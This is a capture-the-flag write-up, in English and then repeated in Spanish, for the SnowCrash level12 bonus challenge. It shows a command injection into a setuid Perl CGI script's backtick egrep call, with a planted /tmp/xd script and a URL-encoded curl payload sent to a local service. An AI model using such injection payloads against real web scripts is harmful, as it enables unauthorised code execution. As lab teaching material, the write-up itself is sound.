### LEVEL12 (BONUS)

- We have a Perl script.
    ```bash
    evel12@SnowCrash:~$ ls -la
    [...]
    -rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
    [...]
    ```

- The only interesting thing I see in the script code is this line:
    ```perl
    [...]
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
    [...]
    ```

- This line performs an egrep with the first parameter of the query, and here is where the attack vector lies.

- The first parameter is processed to convert it to uppercase and remove spaces.
    ```perl
    [...]
    $xx =~ tr/a-z/A-Z/;
    $xx =~ s/\s.*//;
    [...]
    ```

- I'm thinking of trying to inject something into the parameter to bypass the egrep and edit a file `/tmp/xd` to execute code.

- The first step is to create the file `/tmp/xd`.
    ```bash
    level12@SnowCrash:~$ vi /tmp/xd
    #!/bin/bash
    /bin/getflag > /tmp/a
    ```

- We give permissions to the file `/tmp/xd` (important).

- Now comes the injection `"|1>&2"` leaving the line:
    ```perl
    @output = egrep ""|1>&2"" /tmp/xd 2>&1
    ```

- We pass it through `curl`.
    ```bash
    curl 'http://127.0.0.1:4646/?x="|1>&2"'
    ```

- It doesn't work because the character `&` needs to be URL encoded as `%26`, resulting in the injection `"|1>%262"`.
    ```bash
    curl 'http://127.0.0.1:4646/?x="|1>%262"'
    ```

- Now 
    ```bash
    cat /tmp/a
    ```

- Done.

---

### LEVEL12 (BONUS)

- Tenemos un scrip en perl
    ```bash
    evel12@SnowCrash:~$ ls -la
    [...]
    -rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
    [...]
    ```

- Lo unico interesante que veo en el codigo del script es esta línea:
    ```perl
    [...]
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
    [...]
    ```

- Esta línea hace un egrep con el primer parametro de la consulta y aquí es donde está el vector de ataque

- El primer parametro es tratado para ponerlo en uppercase y quitar espacios
    ```perl
    [...]
    $xx =~ tr/a-z/A-Z/;
    $xx =~ s/\s.*//;
    [...]
    ```

- Se me ocurre intentar inyectar algo en el parametro para poder saltar el egrep y editar un archivo /tmp/xd para ejecutar condigo

- Lo primero es crear el archivo `/tmp/xd`
    ```bash
    level12@SnowCrash:~$ vi /tmp/xd
    #!/bin/bash
    /bin/getflag > /tmp/a
    ```

- Damos permisos al archivo `/tmp/xd` (importante)

- Ahora queda la inyeccióm `"|1>&2"` quedando la línea 
    ```perl
    @output = egrep ""|1>&2"" /tmp/xd 2>&1
    ```

- Se lo paso por `curl`
    ```bash
    curl 'http://127.0.0.1:4646/?x="|1>&2"'
    ```

- No funciona porque el caracter `&` hay que urlncoder `%26` quedando la inyeccioón `"|1>%262"`
    ```bash
    curl 'http://127.0.0.1:4646/?x="|1>%262"'
    ```

- Ahora 
    ```bash
    cat /tmp/a
    ```

- Listo
